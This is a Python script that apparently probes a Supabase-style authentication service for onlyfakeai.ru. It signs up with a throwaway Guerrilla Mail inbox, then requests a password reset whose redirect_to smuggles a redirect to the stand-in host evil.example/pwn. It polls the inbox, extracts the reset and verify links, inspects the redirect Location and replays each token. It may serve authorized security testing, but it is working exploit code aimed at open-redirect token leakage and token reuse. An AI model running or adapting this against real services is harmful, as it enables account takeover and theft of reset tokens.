import ssl, json, urllib.request, urllib.error, urllib.parse, sys, time, random, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
ctx = ssl.create_default_context()
KEY = "<publishable-key>"
SUPA = "https://cdn.onlyfakeai.ru"
GM = "https://api.guerrillamail.com/ajax.php"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "application/json", "Content-Type": "application/json"}

def req(method, url, body=None, token=None, extra=None, follow=True):
    h = dict(UA)
    if token: h["Authorization"] = f"Bearer {token}"
    if extra: h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    class NoRedir(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k): return None
    opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler() if follow else NoRedir)
    try:
        with opener.open(r, timeout=30) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, {}, repr(e)

st, hd, b = req("GET", GM + "?f=get_email_address&lang=en&site=guerrillamail.com")
d = json.loads(b); sid = d["sid_token"]; addr = d["email_addr"].split("@")[0] + "@sharklasers.com"
print("inbox:", addr, "sid:", sid[:6] + "...")
pw = "Zq7#vL2!mX9$wR4"
st, hd, b = req("POST", SUPA + "/auth/v1/signup", {"email": addr, "password": pw}, extra={"apikey": KEY})
print("signup:", st, b[:90])
deep = "https://onlyfakeai.ru/login?redirect=https%3A%2F%2Fevil.example%2Fpwn"
st, hd, b = req("POST", SUPA + "/auth/v1/recover", {"email": addr, "redirect_to": deep}, extra={"apikey": KEY})
print("recover:", st, b[:120])

target = None
for i in range(30):
    time.sleep(4)
    st, hd, b = req("GET", GM + f"?f=get_email_list&offset=0&sid_token={sid}")
    try:
        lst = json.loads(b).get("list", [])
    except Exception:
        lst = []
    hits = [m for m in lst if "onlyfake" in (m.get("mail_from") or "").lower() or "reset" in (m.get("mail_subject") or "").lower()]
    if i % 3 == 0:
        print(f"poll {i}: total={len(lst)} hits={len(hits)}")
    if hits:
        target = hits[0]
        break
print("TARGET:", json.dumps(target)[:400] if target else "NONE")
if target:
    st, hd, b = req("GET", GM + f"?f=fetch_email&email_id={target['mail_id']}&sid_token={sid}")
    try:
        msg = json.loads(b)
    except Exception:
        msg = {"raw": b[:2000]}
    print("\nFROM:", msg.get("mail_from"), "| SUBJ:", msg.get("mail_subject"))
    parts = []
    for k in ("mail_body", "mail_body_text", "mail_body_html"):
        v = msg.get(k)
        if isinstance(v, str): parts.append(v)
    body = "\n".join(parts)
    print("BODY:", re.sub(r"\s+", " ", body)[:1500])
    links = list(dict.fromkeys(re.findall(r"https?://[^\s\"'<>\)]+", body) + re.findall(r"https?://[^\s\"'<>\)]+", urllib.parse.unquote(body))))
    print("\nLINKS:")
    for u in links: print("  ", u[:500])
    for u in links:
        if "verify" not in u and "token=" not in u: continue
        u = u.replace("&amp;", "&")
        stc, hdc, bc = req("GET", u, extra={"apikey": KEY}, follow=False)
        loc = hdc.get("Location") or ""
        print("\nCLICK:", stc, "Location:", loc[:800])
        stc2, hdc2, bc2 = req("GET", u, extra={"apikey": KEY}, follow=False)
        print("REPLAY:", stc2, bc2[:200])
